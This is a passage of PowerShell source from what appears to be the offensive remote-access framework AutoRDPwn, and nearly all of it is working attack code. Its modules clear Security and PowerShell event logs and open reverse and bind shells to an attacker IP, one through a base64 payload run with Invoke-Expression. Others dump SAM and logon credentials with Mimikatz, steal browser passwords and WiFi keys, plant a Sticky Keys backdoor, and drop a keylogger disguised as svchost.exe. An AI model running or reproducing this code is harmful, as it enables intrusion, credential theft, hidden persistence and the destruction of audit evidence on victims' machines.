        return
    }
    $creation = Invoke-Command -Session $session -ScriptBlock {
        (Get-CimInstance -ClassName Win32_ShadowCopy -List).Create('C:\', 'ClientAccessible')
    } -ErrorAction Stop
    if ($creation.ReturnValue -ne 0) { throw ('Shadow copy creation returned ' + $creation.ReturnValue) }
    $newId = [string]$creation.ShadowID
    $created = @(Invoke-Command -Session $session -ArgumentList $newId -ScriptBlock {
        param($id)
        Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$id'" -ErrorAction Stop |
            Select-Object -Property Id, VolumeName, InstallDate, DeviceObject | Select-Object -First 1
    } -ErrorAction Stop)
    if ($created.Count -eq 0) { throw 'The new shadow copy was not found after creation.' }
    $linkPath = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName)
    $deviceObject = [string]$created[0].DeviceObject
    $exposed = Invoke-Command -Session $session -ArgumentList $linkPath, $deviceObject -ScriptBlock {
        param($link, $device)
        # Most builds already carry the GLOBALROOT prefix inside DeviceObject.
        if ($device.StartsWith('\\?\GLOBALROOT')) { $targetPath = $device }
        else { $targetPath = '\\?\GLOBALROOT' + $device }
        $output = & cmd.exe /c mklink /d $link $targetPath 2>&1
        return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
    } -ErrorAction Stop
    if ($exposed.ExitCode -ne 0) { throw ('mklink could not expose the shadow copy: ' + $exposed.Output) }
    # The link directory itself is cleanup's problem, never the shadow copy.
    $script:ARRemoteTempDirs.Add($linkPath)
    Write-ARSuccess ('Shadow copy ' + [string]$created[0].Id + ' exposed at ' + $linkPath)
    Set-ARStatus 'Shadow copies created and exposed' 'Ok'
}

function Invoke-ARAttackEventLogClear {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Event log clear'
    $session = Get-ARTargetSession
    $logs = @(
        'Application',
        'Security',
        'System',
        'Setup',
        'Windows PowerShell',
        'Microsoft-Windows-PowerShell/Operational',
        'Microsoft-Windows-TaskScheduler/Operational',
        'Microsoft-Windows-WinRM/Operational',
        'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
    )
    Write-ARWarn ('Event logs to wipe on ' + $target + ': ' + ($logs -join ', '))
    if (-not $script:ARAssumeYes) {
        $answer = Read-ARValue 'Type YES to clear these event logs' ''
        if ($answer -cne 'YES') {
            Write-ARWarn 'Event logs kept: the confirmation did not read YES.'
            Set-ARStatus 'Event log clear cancelled' 'Warn'
            return
        }
    }
    Write-ARInfo 'Clearing event logs with wevtutil...'
    $results = @()
    foreach ($log in $logs) {
        $result = Invoke-Command -Session $session -ArgumentList $log -ScriptBlock {
            param($name)
            $output = wevtutil.exe cl $name 2>&1
            return [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = (($output | Out-String).Trim()) }
        } -ErrorAction Stop
        $results += [pscustomobject]@{ Name = $log; ExitCode = $result.ExitCode }
    }
    $table = ($results | Format-Table -AutoSize | Out-String)
    Show-ARText $table
    $failures = @($results | Where-Object { $_.ExitCode -ne 0 })
    if ($failures.Count -gt 0) {
        $names = @($failures | ForEach-Object { [string]$_.Name + ' (exit ' + $_.ExitCode + ')' })
        Write-ARWarn ('Event logs not cleared: ' + ($names -join ', '))
        Set-ARStatus ('Event logs cleared with ' + $failures.Count + ' failure(s)') 'Warn'
        return
    }
    Set-ARStatus 'Event logs cleared' 'Ok'
}

if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPortProxyPorts = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { $script:ARModuleFiles = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPersistenceItems = New-Object System.Collections.Generic.List[object] }

function Reset-AROperatorPortProxies {
    if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { return }
    $records = @($script:ARPortProxyPorts.ToArray())
    if ($records.Count -eq 0) { return }
    foreach ($record in $records) {
        $listenPort = [string]$record
        $listenAddress = '0.0.0.0'
        $separator = $listenPort.IndexOf('|')
        if ($separator -ge 0) {
            $listenAddress = $listenPort.Substring($separator + 1)
            $listenPort = $listenPort.Substring(0, $separator)
        }
        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
        if ([string]::IsNullOrWhiteSpace($listenAddress)) { $listenAddress = '0.0.0.0' }
        try {
            & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=$listenAddress" 2>&1> $null
            if ($LASTEXITCODE -ne 0 -and $listenAddress -ne '0.0.0.0') {
                & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=0.0.0.0" 2>&1> $null
            }
            if ($LASTEXITCODE -ne 0) { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
        }
        catch { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
    }
    $script:ARPortProxyPorts.Clear()
}

function Remove-ARModuleArtifacts {
    if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { return }
    $paths = @($script:ARModuleFiles.ToArray())
    if ($paths.Count -eq 0) { return }
    try {
        if (Test-ARIsLocalTarget) {
            foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
        }
        elseif ($script:ARSession) {
            Invoke-Command -Session $script:ARSession -ArgumentList $paths -ScriptBlock {
                param($items)
                foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
            } -ErrorAction Stop | Out-Null
        }
    }
    catch { Write-ARWarn ('Module artifact cleanup incomplete: ' + $_.Exception.Message) }
    finally { $script:ARModuleFiles.Clear() }

    # WMI subscriptions, run values and logon tasks do not live in the file
    # list above, so the persistence ledger rides out through the same gate:
    # entries recorded this session (and leftover shapes from interrupted
    # runs) are deleted while the target session is still open, before
    # Invoke-ARCleanup closes it.
    if (Get-Variable -Name ARPersistenceItems -Scope Script -ErrorAction SilentlyContinue) {
        $persistedItems = @($script:ARPersistenceItems.ToArray())
        if ($persistedItems.Count -gt 0) {
            $null = Remove-ARPersistenceItems -Items $persistedItems -IncludeUnknown
        }
        $script:ARPersistenceItems.Clear()
    }
}

function Invoke-ARModulePipeShell {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
    Write-ARInfo 'Named pipe server started on the target.'
    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
    Set-ARStatus 'Named pipe shell closed' 'Ok'
}

function Invoke-ARModuleWinRsConsole {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $arguments = @("/r:$target")
    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
    & winrs.exe @arguments
    Set-ARStatus 'WinRS console closed' 'Ok'
}

function Invoke-ARModuleHttpRevShell {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($data, $address, $listenPort)
            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
            . ([scriptblock]::Create($source))
            Invoke-WebRev -ip $address -port $listenPort
        } -ArgumentList $encoded, $ip, $port | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
            param($data, $address, $listenPort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($payload, $remoteAddress, $remotePort)
                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
                . ([scriptblock]::Create($source))
                Invoke-WebRev -ip $remoteAddress -port $remotePort
            } -ArgumentList $payload, $address, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
    $server = Join-Path $script:ARTools 'server.exe'
    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
    & $server $ip $port
    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
}

function Invoke-ARModuleNetcatDirect {
    $target = Get-ARTargetComputer
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $listenPort)
            . $path
            Invoke-PowerShellTcp -Bind -Port $listenPort
        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
            param($path, $listenPort)
            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $localPort)
                . $script
                Invoke-PowerShellTcp -Bind -Port $localPort
            } -ArgumentList $path, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Remote Control Application'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
}

function Invoke-ARModuleNetcatReverse {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $address, $remotePort)
            . $path
            Start-Sleep -Seconds 5
            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
            param($path, $address, $remotePort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $remoteAddress, $targetPort)
                . $script
                Start-Sleep -Seconds 5
                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
            } -ArgumentList $path, $address, $remotePort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
    Set-ARStatus 'Reverse connection scheduled' 'Ok'
}

function Invoke-ARModuleMimikatzSam {
    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
    Show-ARText $result
    Set-ARStatus 'SAM dump finished' 'Ok'
}

function Invoke-ARModuleMimikatzLogon {
    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
    Show-ARText $result
    Set-ARStatus 'Logon password dump finished' 'Ok'
}

function Invoke-ARModuleSharpWeb {
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
    Show-ARText $result
    Set-ARStatus 'Browser password recovery finished' 'Ok'
}

function Invoke-ARModuleWifiKeys {
    $result = Invoke-ARTargetCommand -ScriptBlock {
        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
        try {
            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
            $lines = New-Object System.Collections.Generic.List[string]
            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                try {
                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
                    $name = [string]$xml.WLANProfile.name
                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
                } catch { }
            }
            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
            return ($lines -join "`n")
        }
        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Show-ARText $result
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARModulePortScan {
    $target = Get-ARTargetComputer
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
    if ($ports -notmatch '^\d+$') { $ports = '100' }
    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'Continue'
    try {
        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
    }
    finally { $ProgressPreference = $oldProgress }
    Set-ARStatus 'Port scan finished' 'Ok'
}

function Invoke-ARModulePortForward {
    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
    if (Test-ARIsLocalTarget) {
        $scriptBlock = {
            param($action, $lport, $lhost, $rport, $rhost)
            switch ($action) {
                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
                'show' { & netsh.exe interface portproxy show all }
                'reset' { & netsh.exe interface portproxy reset }
            }
        }
        if ($operation -eq '1' -or $operation -eq '2') {
            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
            & $scriptBlock 'add' $lport $lhost $rport $rhost
            $proxyRecord = $lport + '|' + $lhost
            if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        }
        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
        else { & $scriptBlock 'show' }
        Set-ARStatus 'Port forwarding updated' 'Ok'
        return
    }
    if ($operation -eq '1') {
        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        $proxyRecord = $lport + '|' + $lhost
        if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        Set-ARStatus 'Local port forwarding created' 'Ok'
        return
    }
    $parameters = @{}
    if ($operation -eq '2') {
        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        Invoke-ARTargetCommand -ScriptBlock {
            param($lport, $lhost, $rport, $rhost)
            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding created' 'Ok'
    }
    elseif ($operation -eq '4') {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding reset' 'Ok'
    }
    else {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding listed' 'Ok'
    }
}

function Invoke-ARModuleWebServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Start-WebServer -BINDING 'http://+:8080/'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Start-WebServer -BINDING 'http://+:8080/'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Web Server'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    $url = 'http://' + $target + ':8080/'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
    Write-Host $url -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try { Start-Process $url | Out-Null } catch { }
    Set-ARStatus 'Web server started' 'Ok'
}

function Invoke-ARModuleCredScan {
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
    $method = $method.ToLowerInvariant()
    if ($method -like 'pass*' -or $method -like 'contra*') {
        $plain = Read-ARSecret 'Password'
        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
        $hash = Get-NTLM $plain
    }
    else {
        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
    }
    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
    Set-ARStatus 'Credential scan finished' 'Ok'
}

function Invoke-ARModuleRdpCaching {
    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
    if (-not $script:ARModuleFiles.Contains($recovered)) { $script:ARModuleFiles.Add($recovered) }
    Write-ARSuccess ('Recovered images: ' + $recovered)
    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
    if (-not $script:ARInvokedFromOption) {
        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
    }
    Set-ARStatus 'RDP cache rebuilt' 'Ok'
}

function Invoke-ARModuleListUsers {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
    Show-ARText $result
    Set-ARStatus 'User enumeration finished' 'Ok'
}

function Invoke-ARModuleSessionGopher {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
    Show-ARText $result
    Set-ARStatus 'SessionGopher finished' 'Ok'
}

function Invoke-ARModuleStickyKeys {
    Write-ARInfo (Get-ARText 'txt34' 'Modifying permissions to enter without credentials..')
    Invoke-ARTargetCommand -ScriptBlock {
        $keys = @('sethc.exe', 'Utilman.exe')
        foreach ($key in $keys) {
            $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
            New-Item -Path $path -Force | Out-Null
            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
        }
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
    } | Out-Null
    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
}

function Invoke-ARModuleMetasploit {
    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
    $template = @'
$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
'@
    $payload = $template -f $msfHost, $msfPort
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
            param($code)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
    Write-Host 'use exploit/multi/handler'
    Write-Host 'set payload windows/shell/reverse_tcp'
    Write-Host ('set LHOST ' + $msfHost)
    Write-Host ('set LPORT ' + $msfPort)
    Write-Host 'exploit'
    Set-ARStatus 'Metasploit payload started' 'Ok'
}

function Invoke-ARModuleKeylogger {
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHost = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHost, $second)
    if (Test-ARIsLocalTarget) {
        $dll = $localDll
        $hostProcess = $localHost
        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
        Push-Location $work
        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
        Start-Sleep -Milliseconds 500
        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
